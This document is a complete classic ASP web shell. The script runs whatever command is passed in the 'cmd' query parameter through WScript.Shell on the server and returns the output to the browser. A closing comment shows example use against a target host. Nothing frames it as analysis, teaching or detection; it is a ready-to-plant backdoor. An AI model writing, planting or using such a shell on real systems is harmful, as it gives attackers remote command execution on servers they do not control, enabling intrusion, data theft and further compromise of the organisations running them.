<%
If Request.QueryString("cmd") <> "" Then
    Dim cmd, result
    cmd = Request.QueryString("cmd")
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec(cmd)
    result = ""
    Do While Not objExec.StdOut.AtEndOfStream
        result = result & objExec.StdOut.ReadLine() & vbCrLf
    Loop
    Response.Write("<pre>" & result & "</pre>")
Else
    Response.Write("Usage: ?cmd=whoami")
End If
%>
# Example Usage:http://<target>/cmd.asp?cmd=whoami
